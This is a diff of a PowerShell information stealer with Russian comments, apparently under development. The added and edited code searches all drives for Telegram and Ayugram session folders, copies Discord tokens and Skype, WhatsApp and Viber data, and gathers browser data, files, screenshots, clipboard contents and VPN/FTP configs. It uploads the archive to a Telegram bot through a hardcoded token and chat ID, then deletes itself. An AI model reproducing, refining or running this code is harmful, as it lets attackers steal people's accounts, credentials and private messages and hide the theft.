@@ -1,9 +1,9 @@
-# --- Настройки Telegram ---
+# --- Telegram настройки ---
 $BotToken = '8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I'
 $YourChatId = '1266539824'
-$MaxPartSize = 49MB  # лимит Telegram
+$MaxPartSize = 49MB
 
-# --- Настройки сбора данных ---
+# --- Модули сбора ---
 $StealBrowserData      = $true
 $StealFiles            = $true
 $StealSystemInfo       = $true
@@ -13,8 +13,6 @@ $StealSessionsAndTokens= $true
 $TakeScreenshot        = $true
 $GrabClipboard         = $true
 $StealVpnFtp           = $true
-
-# --- Настройки очистки ---
 $SelfDelete = $true
 
 $OutputMessages = @{
@@ -28,7 +26,7 @@ $OutputMessages = @{
     Tokens       = "[+] Поиск токенов авторизации..."
     Screenshot   = "[+] Создание скриншота экрана..."
     Clipboard    = "[+] Копирование данных из буфера обмена..."
-    VpnFtp       = "[+] Поиск конфигураций VPN, FTP (FileZilla, WinSCP)..."
+    VpnFtp       = "[+] Поиск конфигураций VPN, FTP..."
     Archiving    = "[+] Архивирование данных..."
     Sending      = "[+] Отправка архива в Telegram..."
     Cleaning     = "[+] Очистка следов..."
@@ -38,39 +36,27 @@ $OutputMessages = @{
 function Send-TelegramFile {
     param([string]$FilePath, [string]$Caption = "")
     $Url = "https://api.telegram.org/bot$BotToken/sendDocument"
-
     $FormData = @{
         chat_id = $YourChatId
         caption = $Caption
     }
-
     $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-    $fileName = [System.IO.Path]::GetFileName($FilePath)
-
     $boundary = [System.Guid]::NewGuid().ToString()
     $LF = "`r`n"
     $bodyLines = @()
-
     foreach ($key in $FormData.Keys) {
         $bodyLines += "--$boundary$LF"
-        $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF"
-        $bodyLines += $FormData[$key]
-        $bodyLines += $LF
+        $bodyLines += "Content-Disposition: form-data; name=`"$key`"$LF$LF$($FormData[$key])$LF"
     }
-
     $bodyLines += "--$boundary$LF"
-    $bodyLines += 'Content-Disposition: form-data; name="document"; filename="' + $fileName + '"' + $LF
-
+    $bodyLines += 'Content-Disposition: form-data; name="document"; filename="' + ([System.IO.Path]::GetFileName($FilePath)) + '"' + $LF
     $bodyLines += "Content-Type: application/octet-stream$LF$LF"
-
     $preBody = [Text.Encoding]::UTF8.GetBytes(($bodyLines -join ''))
     $postBody = [Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")
-
     $fullBody = New-Object byte[] ($preBody.Length + $FileBytes.Length + $postBody.Length)
-    [Array]::Copy($preBody, 0, $fullBody, 0, $preBody.Length)
-    [Array]::Copy($FileBytes, 0, $fullBody, $preBody.Length, $FileBytes.Length)
-    [Array]::Copy($postBody, 0, $fullBody, $preBody.Length + $FileBytes.Length, $postBody.Length)
-
+    [Array]::Copy($preBody,     0, $fullBody, 0, $preBody.Length)
+    [Array]::Copy($FileBytes,   0, $fullBody, $preBody.Length, $FileBytes.Length)
+    [Array]::Copy($postBody,    0, $fullBody, $preBody.Length+$FileBytes.Length, $postBody.Length)
     $Headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
     Invoke-WebRequest -Uri $Url -Method Post -Body $fullBody -Headers $Headers
 }
@@ -81,110 +67,96 @@ function Create-SplitArchive {
         [string]$OutputZip,
         [int64]$MaxPartSize = $MaxPartSize
     )
-
     Add-Type -AssemblyName System.IO.Compression.FileSystem
     [System.IO.Compression.ZipFile]::CreateFromDirectory($SourcePath, $OutputZip, [System.IO.Compression.CompressionLevel]::Fastest, $false)
-
     $size = (Get-Item $OutputZip).Length
-
     if ($size -ge $MaxPartSize) {
         $fs = [System.IO.File]::OpenRead($OutputZip)
         $part = 1
         $partFiles = @()
-        try {
-            while ($fs.Position -lt $fs.Length) {
-                $partName = "$($OutputZip -replace '\.zip$', '')_part$part.zip"
-                $bytesToRead = [Math]::Min($MaxPartSize, $fs.Length - $fs.Position)
-                $buffer = New-Object byte[] $bytesToRead
-                $fs.Read($buffer, 0, $bytesToRead) | Out-Null
-                [System.IO.File]::WriteAllBytes($partName, $buffer)
-                $partFiles += $partName
-                $part++
-            }
+        while ($fs.Position -lt $fs.Length) {
+            $partName = "$($OutputZip -replace '\\.zip$', '')_part$part.zip"
+            $bytesToRead = [Math]::Min($MaxPartSize, $fs.Length - $fs.Position)
+            $buffer = New-Object byte[] $bytesToRead
+            $fs.Read($buffer, 0, $bytesToRead) | Out-Null
+            [System.IO.File]::WriteAllBytes($partName, $buffer)
+            $partFiles += $partName
+            $part++
         }
-        finally { $fs.Close() }
+        $fs.Close()
         Remove-Item $OutputZip -Force
         return $partFiles
     }
     return @($OutputZip)
 }
 
-function Start-Stealer {
-    $LogFolder = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
-    if (-not (Test-Path $LogFolder)) {
-        New-Item -Path $LogFolder -ItemType Directory -Force | Out-Null
-    }
-    Write-Host $OutputMessages.Start -ForegroundColor Yellow
+function Get-MessengerData {
+    param($LogPath)
+    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
 
-    try {
-        if ($StealSystemInfo) {
-            Write-Host $OutputMessages.SystemInfo -ForegroundColor Cyan
-            Get-SystemInformation -LogPath $LogFolder
-        }
-        if ($TakeScreenshot) {
-            Write-Host $OutputMessages.Screenshot -ForegroundColor Cyan
-            Get-Screenshot -LogPath $LogFolder
-        }
-        if ($GrabClipboard) {
-            Write-Host $OutputMessages.Clipboard -ForegroundColor Cyan
-            Get-ClipboardData -LogPath $LogFolder
-        }
-        if ($StealBrowserData) {
-            Write-Host $OutputMessages.BrowserSearch -ForegroundColor Cyan
-            $BrowserProfiles = Find-AllBrowserProfiles
-            if ($null -ne $BrowserProfiles) {
-                Write-Host $OutputMessages.BrowserData -ForegroundColor Cyan
-                Get-BrowserFiles -BrowserProfiles $BrowserProfiles -LogPath "$LogFolder\BrowserData"
+    # ПОИСК Telegram и Ayugram любых типов по всем дискам, включая portable в любых местах
+    $diskLetters = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Name -match '^[A-Z]$' }
+    $searchDirs = @()
+    foreach ($d in $diskLetters) {
+        $drivePath = $d.Name + ":\\"
+        $searchDirs += Get-ChildItem -Path $drivePath -Directory -ErrorAction SilentlyContinue -Depth 3 |
+            Where-Object { $_.Name -match '(telegram|ayugram|tg)' }
+    }
+    foreach ($dir in $searchDirs) {
+        foreach ($folderType in @("tdata", "TData")) {
+            $td = Join-Path $dir.FullName $folderType
+            if (Test-Path $td) {
+                $typeLabel = "Unknown"
+                if ($dir.FullName -match "ayugram") { $typeLabel = "Ayugram" }
+                elseif ($dir.FullName -match "telegram" -and $dir.FullName -match "portable") { $typeLabel = "TelegramPortable" }
+                elseif ($dir.FullName -match "telegram") { $typeLabel = "TelegramDesktop" }
+                Copy-Item -Path $td -Destination (Join-Path $LogPath $typeLabel+"_"+([System.IO.Path]::GetFileName($dir.FullName))) -Recurse -Force -ErrorAction SilentlyContinue
             }
         }
-        if ($StealFiles) {
-            Write-Host $OutputMessages.Files -ForegroundColor Cyan
-            Copy-UserFiles -LogPath "$LogFolder\Files"
-        }
-        if ($StealGamingSessions) {
-            Write-Host $OutputMessages.Gaming -ForegroundColor Cyan
-            Get-GamingData -LogPath "$LogFolder\Gaming"
-        }
-        if ($StealMessengerLogs) {
-            Write-Host $OutputMessages.Messengers -ForegroundColor Cyan
-            Get-MessengerData -LogPath "$LogFolder\Messengers"
-        }
-        if ($StealSessionsAndTokens) {
-            Write-Host $OutputMessages.Tokens -ForegroundColor Cyan
-            Get-Tokens -LogPath "$LogFolder\Tokens" -BrowserProfiles $BrowserProfiles
-        }
-        if ($StealVpnFtp) {
-            Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan
-            Get-VpnFtpData -LogPath "$LogFolder\VpnFtp"
-        }
-
-        $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
-        Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
-
-        $archiveFiles = Create-SplitArchive -SourcePath $LogFolder -OutputZip $ZipPath -MaxPartSize $MaxPartSize
-
-        Write-Host $OutputMessages.Sending -ForegroundColor Yellow
-        $i = 1
-        foreach ($archiveFile in $archiveFiles) {
-            Send-TelegramFile -FilePath $archiveFile -Caption "Лог $(if($archiveFiles.Count -gt 1){"part $i "})$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') с устройства $env:COMPUTERNAME"
-            Remove-Item $archiveFile -Force -ErrorAction SilentlyContinue
-            $i++
-        }
     }
-    catch {
-        Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
-    }
-    finally {
-        Write-Host $OutputMessages.Cleaning -ForegroundColor Yellow
-        Remove-Item -Path $LogFolder -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item -Path $ZipPath -Force -ErrorAction SilentlyContinue
-        if ($SelfDelete) {
-            $scriptPath = $MyInvocation.MyCommand.Path
-            if ($scriptPath -and (Test-Path $scriptPath)) {
-                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
+    # Стандартные места Telegram Desktop
+    foreach ($base in @("$env:APPDATA", "$env:LOCALAPPDATA", "$env:USERPROFILE\\AppData\\Local", "$env:USERPROFILE")) {
+        foreach ($appName in @("Telegram Desktop", "TelegramPortable", "Ayugram")) {
+            $td = Join-Path $base "$appName\\tdata"
+            if (Test-Path $td) {
+                Copy-Item -Path $td -Destination (Join-Path $LogPath $appName+"_"+([System.IO.Path]::GetFileName($base))) -Recurse -Force -ErrorAction SilentlyContinue
             }
         }
-        Write-Host $OutputMessages.Complete -ForegroundColor Green
+    }
+
+    # Поиск Ayugram portable (ищет в любых подпапках)
+    foreach ($d in $diskLetters) {
+        $drivePath = $d.Name + ":\\"
+        $ayugrams = Get-ChildItem -Path $drivePath -Directory -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "ayugram" }
+        foreach ($ay in $ayugrams) {
+            $td = Join-Path $ay.FullName "tdata"
+            if (Test-Path $td) {
+                Copy-Item -Path $td -Destination (Join-Path $LogPath "AyugramPortable_"+([System.IO.Path]::GetFileName($ay.FullName))) -Recurse -Force -ErrorAction SilentlyContinue
+            }
+        }
+    }
+
+    # Discord
+    foreach ($path in @("$env:APPDATA\\discord", "$env:APPDATA\\discordcanary", "$env:APPDATA\\discordptb")) {
+        $storagePath = Join-Path $path "Local Storage\\leveldb"
+        if (Test-Path $storagePath) {
+            Copy-Item -Path $storagePath -Destination (Join-Path $LogPath "Discord_$([System.IO.Path]::GetFileName($path))") -Recurse -Force
+        }
+    }
+    # Skype
+    $skypePath = "$env:APPDATA\\Skype"
+    if (Test-Path $skypePath) {
+        Copy-Item -Path $skypePath -Destination (Join-Path $LogPath "Skype") -Recurse -Force
+    }
+    # WhatsApp Desktop
+    $waPath = "$env:APPDATA\\WhatsApp"
+    if (Test-Path $waPath) {
+        Copy-Item -Path $waPath -Destination (Join-Path $LogPath "WhatsApp") -Recurse -Force
+    }
+    # Viber
+    $viberPath = "$env:APPDATA\\ViberPC"
+    if (Test-Path $viberPath) {
+        Copy-Item -Path $viberPath -Destination (Join-Path $LogPath "Viber") -Recurse -Force
     }
 }
 
@@ -498,6 +470,47 @@ function Get-VpnFtpData {
             Copy-Item $f.FullName -Destination $targetdir -Force
         }
     } catch {}
+}
+
+function Start-Stealer {
+    $LogFolder = "$env:TEMP\\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
+    if (-not (Test-Path $LogFolder)) { New-Item -Path $LogFolder -ItemType Directory -Force | Out-Null }
+    Write-Host $OutputMessages.Start -ForegroundColor Yellow
+
+    try {
+        if ($StealSystemInfo)         { Write-Host $OutputMessages.SystemInfo -ForegroundColor Cyan; Get-SystemInformation -LogPath $LogFolder }
+        if ($TakeScreenshot)          { Write-Host $OutputMessages.Screenshot -ForegroundColor Cyan; Get-Screenshot -LogPath $LogFolder }
+        if ($GrabClipboard)           { Write-Host $OutputMessages.Clipboard -ForegroundColor Cyan; Get-ClipboardData -LogPath $LogFolder }
+        if ($StealBrowserData)        { Write-Host $OutputMessages.BrowserSearch -ForegroundColor Cyan; $BrowserProfiles = Find-AllBrowserProfiles; if ($null -ne $BrowserProfiles) { Write-Host $OutputMessages.BrowserData -ForegroundColor Cyan; Get-BrowserFiles -BrowserProfiles $BrowserProfiles -LogPath "$LogFolder\\BrowserData" } }
+        if ($StealFiles)              { Write-Host $OutputMessages.Files -ForegroundColor Cyan; Copy-UserFiles -LogPath "$LogFolder\\Files" }
+        if ($StealGamingSessions)     { Write-Host $OutputMessages.Gaming -ForegroundColor Cyan; Get-GamingData -LogPath "$LogFolder\\Gaming" }
+        if ($StealMessengerLogs)      { Write-Host $OutputMessages.Messengers -ForegroundColor Cyan; Get-MessengerData -LogPath "$LogFolder\\Messengers" }
+        if ($StealSessionsAndTokens)  { Write-Host $OutputMessages.Tokens -ForegroundColor Cyan; Get-Tokens -LogPath "$LogFolder\\Tokens" -BrowserProfiles $BrowserProfiles }
+        if ($StealVpnFtp)             { Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan; Get-VpnFtpData -LogPath "$LogFolder\\VpnFtp" }
+        $ZipPath = "$env:TEMP\\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
+        Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
+        $archiveFiles = Create-SplitArchive -SourcePath $LogFolder -OutputZip $ZipPath -MaxPartSize $MaxPartSize
+        Write-Host $OutputMessages.Sending -ForegroundColor Yellow
+        $i = 1
+        foreach ($archiveFile in $archiveFiles) {
+            Send-TelegramFile -FilePath $archiveFile -Caption "Лог $(if($archiveFiles.Count -gt 1){"part $i "})$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') с устройства $env:COMPUTERNAME"
+            Remove-Item $archiveFile -Force -ErrorAction SilentlyContinue
+            $i++
+        }
+    }
+    catch {
+        Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    finally {
+        Write-Host $OutputMessages.Cleaning -ForegroundColor Yellow
+        Remove-Item -Path $LogFolder -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path $ZipPath -Force -ErrorAction SilentlyContinue
+        if ($SelfDelete) {
+            $scriptPath = $MyInvocation.MyCommand.Path
+            if ($scriptPath -and (Test-Path $scriptPath)) { Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue }
+        }
+        Write-Host $OutputMessages.Complete -ForegroundColor Green
+    }
 }
 
 Start-Stealer
